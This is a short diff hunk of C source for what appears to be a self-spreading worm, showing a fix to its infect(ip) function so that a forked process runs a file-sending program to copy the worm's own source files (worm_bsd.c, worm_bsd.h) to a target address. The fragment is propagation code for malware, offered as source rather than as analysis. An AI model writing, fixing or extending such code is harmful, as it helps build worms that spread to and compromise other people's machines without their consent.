@@ -107,10 +107,11 @@ void infect(ip)
     printf("[*] Forking to create send_file process\n");
 
     if (fork() == 0) {
-        argv[0] = "send_file_over_socket_bsd.c";
-        argv[1] = "worm_bsd.c";
-        argv[2] = "worm_bsd.h";
-        argv[3] = (char *)0;
+        argv[0] = "send_file_over_socket_bsd";
+        argv[1] = "send_file_over_socket_bsd.c"; 
+        argv[2] = "worm_bsd.c";
+        argv[3] = "worm_bsd.h";
+        argv[4] = (char *)0;
         execv("./send_file_over_socket_bsd", argv);
         exit(1);
     }
